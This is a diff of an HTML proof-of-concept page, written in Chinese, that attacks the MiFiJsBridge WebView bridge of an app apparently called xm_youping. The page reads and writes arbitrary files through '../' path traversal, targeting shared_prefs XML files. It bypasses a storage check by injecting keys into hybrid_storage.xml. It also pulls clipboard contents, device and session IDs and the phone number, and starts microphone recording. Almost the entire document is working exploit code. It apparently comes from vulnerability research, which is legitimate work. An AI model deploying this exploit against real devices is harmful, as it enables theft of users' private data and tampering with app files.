@@ -2,186 +2,435 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>xm_youping bridge poc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>xm_youping merged storage+bridge PoC</title>
   <style>
-    body{font-family:ui-monospace,Consolas,monospace;background:#f6f7fb;color:#111;padding:12px}
-    h2{margin:8px 0}
-    .box{background:#fff;border:1px solid #ddd;border-radius:10px;padding:10px;margin:10px 0}
-    input,textarea,button{font-family:inherit;font-size:14px}
-    input,textarea{width:100%;box-sizing:border-box;padding:6px;margin:4px 0;border:1px solid #ccc;border-radius:6px}
-    textarea{min-height:70px}
-    button{margin:4px 4px 0 0;padding:6px 10px;border:1px solid #999;border-radius:6px;background:#fafafa}
-    #log{white-space:pre-wrap;background:#111;color:#9ef;border-radius:10px;padding:10px;min-height:220px}
+    body { font-family: sans-serif; margin: 14px; line-height: 1.45; }
+    h2,h3 { margin: 10px 0 6px; }
+    input, textarea, select, button { width: 100%; box-sizing: border-box; margin: 6px 0; padding: 8px; }
+    textarea { min-height: 120px; font-family: monospace; }
+    button { cursor: pointer; }
+    pre { background: #f5f5f5; padding: 10px; white-space: pre-wrap; word-break: break-all; }
+    .box { border: 1px solid #ddd; padding: 10px; margin-bottom: 12px; }
+    .row { display: flex; gap: 8px; }
+    .row > button { flex: 1; }
   </style>
 </head>
 <body>
-  <h2>xm_youping 专用 MiFiJsBridge PoC</h2>
+  <h2>xm_youping 合并版 PoC（Storage + Bridge）</h2>
+  <p>页面 URL 需带 <code>_debug=true</code>，例如：<code>https://your-domain/poc_youping_bridge.html?_debug=true</code></p>
 
   <div class="box">
-    <b>Storage（本包与 xmshop 不同：是 setPreference/getPreference/getAllPreferences，不是 V2）</b>
-    <input id="f_name" value="../shared_prefs/secure_lib.xml" placeholder="saveFile/loadFile 的 name（可含 ../）" />
-    <input id="f_auth" value="*" placeholder="authorities，逗号分隔，默认 *" />
-    <textarea id="f_text"><map><int name='version' value='3'/></map></textarea>
-    <textarea id="f_b64" placeholder="二进制Base64（写so时用）"></textarea>
-
-    <button onclick="lookupStorage()">lookup(Storage)</button>
-    <button onclick="saveText()">saveFile(文本)</button>
-    <button onclick="saveB64()">saveFile(Base64)</button>
-    <button onclick="loadFile()">loadFile</button>
-
-    <input id="p_key" value="demo_key" placeholder="preference key" />
-    <input id="p_val" value="demo_val" placeholder="preference value" />
-    <button onclick="setPref()">setPreference</button>
-    <button onclick="getPref()">getPreference</button>
-    <button onclick="getAllPref()">getAllPreferences</button>
+    <h3>1) 读取任意文件（不覆盖目标文件）</h3>
+    <label>读取路径（相对 filesDir，可 ../ 穿越）</label>
+    <input id="readPath" value="../shared_prefs/seq.xml" />
+    <label>读取格式</label>
+    <select id="readFormat">
+      <option value="0" selected>0 (text)</option>
+      <option value="1">1 (base64 binary)</option>
+    </select>
+    <div class="row">
+      <button id="btnInjectMeta">注入 hybrid_storage 元数据键</button>
+      <button id="btnRead">读取任意文件</button>
+    </div>
+    <p style="margin:6px 0;color:#666">注入逻辑：写 <code>../shared_prefs/hybrid_storage.xml</code> 的键值，不直接写目标文件本身。</p>
   </div>
 
   <div class="box">
-    <b>Data</b><br/>
-    <button onclick="getData('getDeviceId')">getDeviceId</button>
-    <button onclick="getData('getSessionId')">getSessionId</button>
-    <button onclick="getData('getDeviceInfo')">getDeviceInfo</button>
+    <h3>2) 写任意文件（内容可控）</h3>
+    <label>写入路径（相对 filesDir，可 ../ 穿越）</label>
+    <input id="writePath" value="../shared_prefs/secure_lib.xml" />
+    <label>写入格式</label>
+    <select id="writeFormat">
+      <option value="0" selected>0 (text)</option>
+      <option value="1">1 (base64 binary)</option>
+    </select>
+    <label>写入内容（可控）</label>
+    <textarea id="writeData"><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <int name='version' value='3' />
+</map></textarea>
+    <button id="btnWriteFile">写任意文件（可控内容）</button>
   </div>
 
   <div class="box">
-    <b>Clipboard</b>
-    <input id="clip_txt" value="poc_clipboard_text" />
-    <button onclick="readClip()">readClipboard</button>
-    <button onclick="writeClip()">writeClipboard</button>
+    <h3>3) Storage 偏好接口（youping 版）</h3>
+    <label>Preference Key</label>
+    <input id="prefKey" value="demo_key" />
+    <label>Preference Value</label>
+    <input id="prefVal" value="demo_val" />
+    <div class="row">
+      <button id="btnSetPref">setPreference</button>
+      <button id="btnGetPref">getPreference</button>
+      <button id="btnGetAllPref">getAllPreferences</button>
+    </div>
   </div>
 
   <div class="box">
-    <b>Account / Voice</b><br/>
-    <button onclick="getPhone()">Account.getPhoneNumber</button>
-    <button onclick="voiceStart()">Voice.startRecord</button>
-    <button onclick="voiceStop()">Voice.stopRecord</button>
-    <button onclick="voiceCancel()">Voice.cancelRecord</button>
+    <h3>4) System.readClipboard / writeClipboard</h3>
+    <label>写入剪贴板内容</label>
+    <input id="clipData" value="poc_clipboard_text" />
+    <div class="row">
+      <button id="btnReadClipboard">读取剪贴板</button>
+      <button id="btnWriteClipboard">写入剪贴板</button>
+    </div>
   </div>
 
-  <div id="log"></div>
+  <div class="box">
+    <h3>5) Data 标识接口（3项）</h3>
+    <button id="btnData3">读取 getDeviceId/getSessionId/getDeviceInfo</button>
+  </div>
+
+  <div class="box">
+    <h3>6) Account.getPhoneNumber</h3>
+    <button id="btnAccountPhone">读取手机号列表</button>
+  </div>
+
+  <div class="box">
+    <h3>7) Voice.startRecord / stopRecord / cancelRecord</h3>
+    <label>startRecord 参数（String）</label>
+    <input id="voiceParam" value="xm_youping_voice" />
+    <div class="row">
+      <button id="btnVoiceStart">startRecord</button>
+      <button id="btnVoiceStop">stopRecord</button>
+      <button id="btnVoiceCancel">cancelRecord</button>
+    </div>
+  </div>
+
+  <h3>输出</h3>
+  <pre id="out"></pre>
 
 <script>
-(function(){
-  const logEl = document.getElementById('log');
-  const hasBridge = () => !!(window.MiFiJsBridge && MiFiJsBridge.invoke && MiFiJsBridge.lookup);
-  const ts = () => new Date().toTimeString().slice(0,8);
-  const log = (x) => {
-    const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
-    logEl.textContent += `[${ts()}] ${s}\n`;
-    logEl.scrollTop = logEl.scrollHeight;
+const out = document.getElementById('out');
+const HYBRID_STORAGE_XML = '../shared_prefs/hybrid_storage.xml';
+
+function log(x) {
+  const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
+  out.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
+}
+
+function parseMaybeJson(raw) {
+  if (raw == null) return raw;
+  if (typeof raw !== 'string') return raw;
+  try { return JSON.parse(raw); } catch (_) { return raw; }
+}
+
+function invoke(feature, action, param, callbackExpr) {
+  const raw = window.MiFiJsBridge.invoke(feature, action, param, callbackExpr || null);
+  return parseMaybeJson(raw);
+}
+
+function lookup(feature, action) {
+  return window.MiFiJsBridge.lookup(feature, action);
+}
+
+function ensureBridge() {
+  if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge missing');
+}
+
+function ensureAvailable(feature, action) {
+  ensureBridge();
+  const code = lookup(feature, action);
+  log({ lookup: { feature, action, code } });
+  if (code !== 0) throw new Error(`${feature}.${action} unavailable, code=${code}`);
+}
+
+function makeCallback(prefix) {
+  const fn = `__mifi_cb_${prefix}_${Date.now()}_${Math.floor(Math.random()*100000)}`;
+  window[fn] = function(respRaw) {
+    const parsed = parseMaybeJson(respRaw);
+    log({ callback: fn, data: parsed });
   };
-  const parse = (ret) => { try { return JSON.parse(ret); } catch(e){ return {raw: ret}; } };
+  return `window.${fn}`;
+}
 
-  function lookup(feature, action){
-    try { return MiFiJsBridge.lookup(feature, action); }
-    catch(e){ return `lookup-ex: ${e.message}`; }
-  }
+function metaValue(format) {
+  return JSON.stringify({ authorities: ['*'], format: Number(format) });
+}
 
-  function invoke(feature, action, param, cb){
-    if(!hasBridge()) throw new Error('MiFiJsBridge not found');
-    let p = null;
-    if(param !== undefined && param !== null){
-      p = (typeof param === 'string') ? param : JSON.stringify(param);
+function escapeXmlAttr(s) {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/'/g, '&apos;');
+}
+
+function escapeXmlText(s) {
+  return String(s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function buildFreshHybridStorageXml(path, format) {
+  const nameEsc = escapeXmlAttr(path);
+  const metaEsc = escapeXmlText(metaValue(format));
+  return `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name='${nameEsc}'>${metaEsc}</string>\n</map>`;
+}
+
+function mergeHybridStorageXml(existingXml, path, format) {
+  try {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(existingXml, 'application/xml');
+    if (doc.getElementsByTagName('parsererror').length > 0) {
+      throw new Error('parsererror');
     }
-    const cbName = cb || null;
-    const raw = MiFiJsBridge.invoke(feature, action, p, cbName);
-    return parse(raw);
-  }
 
-  function authArr(){
-    const s = document.getElementById('f_auth').value.trim();
-    if(!s) return ['*'];
-    return s.split(',').map(v=>v.trim()).filter(Boolean);
-  }
-
-  window.lookupStorage = function(){
-    log({lookup:{
-      setPreference: lookup('Storage','setPreference'),
-      getPreference: lookup('Storage','getPreference'),
-      getAllPreferences: lookup('Storage','getAllPreferences'),
-      saveFile: lookup('Storage','saveFile'),
-      loadFile: lookup('Storage','loadFile')
-    }});
-  };
-
-  window.saveText = function(){
-    const param = {
-      name: document.getElementById('f_name').value,
-      format: 0,
-      data: document.getElementById('f_text').value,
-      authorities: authArr()
-    };
-    log({saveFile_text: invoke('Storage','saveFile', param)});
-  };
-
-  window.saveB64 = function(){
-    const param = {
-      name: document.getElementById('f_name').value,
-      format: 1,
-      data: document.getElementById('f_b64').value.trim(),
-      authorities: authArr()
-    };
-    log({saveFile_b64: invoke('Storage','saveFile', param)});
-  };
-
-  window.loadFile = function(){
-    const name = document.getElementById('f_name').value;
-    const r = invoke('Storage','loadFile', name);
-    log({loadFile: r});
-    if(r && r.code === 200 && /file info not found/.test(JSON.stringify(r))){
-      log('提示: 该实现先查 hybrid_storage 元数据；若未先 saveFile 同名记录，会返回 file info not found。');
+    let map = doc.getElementsByTagName('map')[0];
+    if (!map) {
+      map = doc.createElement('map');
+      while (doc.firstChild) doc.removeChild(doc.firstChild);
+      doc.appendChild(map);
     }
-  };
 
-  window.setPref = function(){
-    const k = document.getElementById('p_key').value;
-    const v = document.getElementById('p_val').value;
+    const strings = Array.from(map.getElementsByTagName('string'));
+    for (const node of strings) {
+      if (node.getAttribute('name') === path) {
+        map.removeChild(node);
+      }
+    }
+
+    const n = doc.createElement('string');
+    n.setAttribute('name', path);
+    n.textContent = metaValue(format);
+    map.appendChild(n);
+
+    let xml = new XMLSerializer().serializeToString(doc);
+    if (!xml.startsWith('<?xml')) {
+      xml = `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n` + xml;
+    }
+    return xml;
+  } catch (e) {
+    log('merge 失败，使用全新模板写入 hybrid_storage.xml: ' + e.message);
+    return buildFreshHybridStorageXml(path, format);
+  }
+}
+
+function saveTextFile(name, text, authorities) {
+  ensureAvailable('Storage', 'saveFile');
+  const req = JSON.stringify({
+    name,
+    data: text,
+    format: 0,
+    authorities: authorities || ['*']
+  });
+  return invoke('Storage', 'saveFile', req);
+}
+
+function loadTextFile(name) {
+  ensureAvailable('Storage', 'loadFile');
+  const r = invoke('Storage', 'loadFile', name);
+  if (r && r.code === 0 && r.content && typeof r.content.data === 'string') {
+    return { ok: true, text: r.content.data, resp: r };
+  }
+  return { ok: false, resp: r };
+}
+
+function injectMetaKey() {
+  try {
+    const path = document.getElementById('readPath').value.trim();
+    const format = Number(document.getElementById('readFormat').value);
+    if (!path) throw new Error('readPath empty');
+
+    let currentXml = null;
+    const loaded = loadTextFile(HYBRID_STORAGE_XML);
+    if (loaded.ok) {
+      currentXml = loaded.text;
+      log('读取到现有 hybrid_storage.xml，准备增量注入');
+    } else {
+      log({ loadHybridStorageBeforeInject: loaded.resp });
+      log('未读到现有 hybrid_storage.xml，将按模板创建（可能覆盖原有键）');
+    }
+
+    const newXml = currentXml
+      ? mergeHybridStorageXml(currentXml, path, format)
+      : buildFreshHybridStorageXml(path, format);
+
+    const wr = saveTextFile(HYBRID_STORAGE_XML, newXml, ['*']);
+    log({ injectMeta_writeHybridStorageXml: wr });
+
+    const verifyHybrid = loadTextFile(HYBRID_STORAGE_XML);
+    log({ verifyHybridStorageXml: verifyHybrid.resp });
+
+    log('注入完成。现在可点击“读取任意文件”。若仍 file info not found，请重进页面后再读。');
+  } catch (e) {
+    log('ERR(injectMeta): ' + e.message);
+  }
+}
+
+function readAny() {
+  try {
+    ensureAvailable('Storage', 'loadFile');
+    const p = document.getElementById('readPath').value.trim();
+    const f = Number(document.getElementById('readFormat').value);
+    if (!p) throw new Error('readPath empty');
+
+    const r = invoke('Storage', 'loadFile', p);
+    log({ loadFile: r });
+
+    if (r && r.code === 0 && r.content && typeof r.content.data === 'string' && f === 1) {
+      try { log('binary bytes=' + atob(r.content.data).length); } catch (_) {}
+    }
+
+    if (r && r.code === 200 && String(JSON.stringify(r)).includes('file info not found')) {
+      log('提示：先点“注入 hybrid_storage 元数据键”再读取。');
+    }
+  } catch (e) {
+    log('ERR(read): ' + e.message);
+  }
+}
+
+function writeAnyFile() {
+  try {
+    ensureAvailable('Storage', 'saveFile');
+    const p = document.getElementById('writePath').value.trim();
+    const d = document.getElementById('writeData').value;
+    const f = Number(document.getElementById('writeFormat').value);
+    if (!p) throw new Error('writePath empty');
+    const req = JSON.stringify({ name: p, data: d, format: f, authorities: ['*'] });
+    const r = invoke('Storage', 'saveFile', req);
+    log({ saveFile: r });
+  } catch (e) {
+    log('ERR(writeFile): ' + e.message);
+  }
+}
+
+function setPref() {
+  try {
+    ensureAvailable('Storage', 'setPreference');
+    const k = document.getElementById('prefKey').value;
+    const v = document.getElementById('prefVal').value;
     const map = {}; map[k] = v;
-    log({setPreference: invoke('Storage','setPreference', map)});
-  };
+    const r = invoke('Storage', 'setPreference', JSON.stringify(map));
+    log({ 'Storage.setPreference': r });
+  } catch (e) {
+    log('ERR(setPref): ' + e.message);
+  }
+}
 
-  window.getPref = function(){
-    log({getPreference: invoke('Storage','getPreference', document.getElementById('p_key').value)});
-  };
+function getPref() {
+  try {
+    ensureAvailable('Storage', 'getPreference');
+    const k = document.getElementById('prefKey').value;
+    const r = invoke('Storage', 'getPreference', k);
+    log({ 'Storage.getPreference': r });
+  } catch (e) {
+    log('ERR(getPref): ' + e.message);
+  }
+}
 
-  window.getAllPref = function(){
-    log({getAllPreferences: invoke('Storage','getAllPreferences', '')});
-  };
+function getAllPref() {
+  try {
+    ensureAvailable('Storage', 'getAllPreferences');
+    const r = invoke('Storage', 'getAllPreferences', '');
+    log({ 'Storage.getAllPreferences': r });
+  } catch (e) {
+    log('ERR(getAllPref): ' + e.message);
+  }
+}
 
-  window.getData = function(action){
-    log({[action]: invoke('Data', action, null)});
-  };
+function readClipboard() {
+  try {
+    ensureAvailable('System', 'readClipboard');
+    const r = invoke('System', 'readClipboard', null);
+    log({ 'System.readClipboard': r });
+  } catch (e) {
+    log('ERR(readClipboard): ' + e.message);
+  }
+}
 
-  window.readClip = function(){
-    log({readClipboard: invoke('System','readClipboard', null)});
-  };
+function writeClipboard() {
+  try {
+    ensureAvailable('System', 'writeClipboard');
+    const d = document.getElementById('clipData').value;
+    const r = invoke('System', 'writeClipboard', d);
+    log({ 'System.writeClipboard': r });
+  } catch (e) {
+    log('ERR(writeClipboard): ' + e.message);
+  }
+}
 
-  window.writeClip = function(){
-    log({writeClipboard: invoke('System','writeClipboard', document.getElementById('clip_txt').value)});
-  };
+function readData3() {
+  try {
+    ensureAvailable('Data', 'getDeviceId');
+    ensureAvailable('Data', 'getSessionId');
+    ensureAvailable('Data', 'getDeviceInfo');
+    const r1 = invoke('Data', 'getDeviceId', null);
+    const r2 = invoke('Data', 'getSessionId', null);
+    const r3 = invoke('Data', 'getDeviceInfo', null);
+    log({
+      'Data.getDeviceId': r1,
+      'Data.getSessionId': r2,
+      'Data.getDeviceInfo': r3
+    });
+  } catch (e) {
+    log('ERR(readData3): ' + e.message);
+  }
+}
 
-  window.getPhone = function(){
-    const r = invoke('Account','getPhoneNumber', null);
-    log({getPhoneNumber: r});
-    if(r && r.code === 202){
-      log('说明: 该App中 Account.getPhoneNumber 受签名门控（非MIUI签名返回202），不是PoC问题。');
+function accountPhone() {
+  try {
+    ensureAvailable('Account', 'getPhoneNumber');
+    const cb = makeCallback('account_phone');
+    const r = invoke('Account', 'getPhoneNumber', null, cb);
+    log({ 'Account.getPhoneNumber': r, callback: cb });
+    if (r && r.code === 202) {
+      log('说明：该包此接口有签名门控，返回202是预期行为。');
     }
-  };
+  } catch (e) {
+    log('ERR(accountPhone): ' + e.message);
+  }
+}
 
-  let voiceCb = null;
-  window.voiceStart = function(){
-    voiceCb = '__mifi_cb_voice_' + Date.now();
-    window[voiceCb] = function(data){ log({voiceCallback: voiceCb, data: data}); };
-    log({voiceStart: invoke('Voice','startRecord', 'xm_youping_voice', 'window.' + voiceCb)});
-  };
+function voiceStart() {
+  try {
+    ensureAvailable('Voice', 'startRecord');
+    const p = document.getElementById('voiceParam').value;
+    const cb = makeCallback('voice_start');
+    const r = invoke('Voice', 'startRecord', p, cb);
+    log({ 'Voice.startRecord': r, callback: cb, param: p });
+  } catch (e) {
+    log('ERR(voiceStart): ' + e.message);
+  }
+}
 
-  window.voiceStop = function(){ log({voiceStop: invoke('Voice','stopRecord', null)}); };
-  window.voiceCancel = function(){ log({voiceCancel: invoke('Voice','cancelRecord', null)}); };
+function voiceStop() {
+  try {
+    ensureAvailable('Voice', 'stopRecord');
+    const r = invoke('Voice', 'stopRecord', null);
+    log({ 'Voice.stopRecord': r });
+  } catch (e) {
+    log('ERR(voiceStop): ' + e.message);
+  }
+}
 
-  log('PoC loaded');
-  if(!hasBridge()) log('MiFiJsBridge NOT found: 请确认走到 JR WebFragment 且 URL 带 _debug=true');
-})();
+function voiceCancel() {
+  try {
+    ensureAvailable('Voice', 'cancelRecord');
+    const r = invoke('Voice', 'cancelRecord', null);
+    log({ 'Voice.cancelRecord': r });
+  } catch (e) {
+    log('ERR(voiceCancel): ' + e.message);
+  }
+}
+
+document.getElementById('btnInjectMeta').addEventListener('click', injectMetaKey);
+document.getElementById('btnRead').addEventListener('click', readAny);
+document.getElementById('btnWriteFile').addEventListener('click', writeAnyFile);
+document.getElementById('btnSetPref').addEventListener('click', setPref);
+document.getElementById('btnGetPref').addEventListener('click', getPref);
+document.getElementById('btnGetAllPref').addEventListener('click', getAllPref);
+document.getElementById('btnReadClipboard').addEventListener('click', readClipboard);
+document.getElementById('btnWriteClipboard').addEventListener('click', writeClipboard);
+document.getElementById('btnData3').addEventListener('click', readData3);
+document.getElementById('btnAccountPhone').addEventListener('click', accountPhone);
+document.getElementById('btnVoiceStart').addEventListener('click', voiceStart);
+document.getElementById('btnVoiceStop').addEventListener('click', voiceStop);
+document.getElementById('btnVoiceCancel').addEventListener('click', voiceCancel);
+
+log('PoC loaded (youping)');
 </script>
 </body>
 </html>
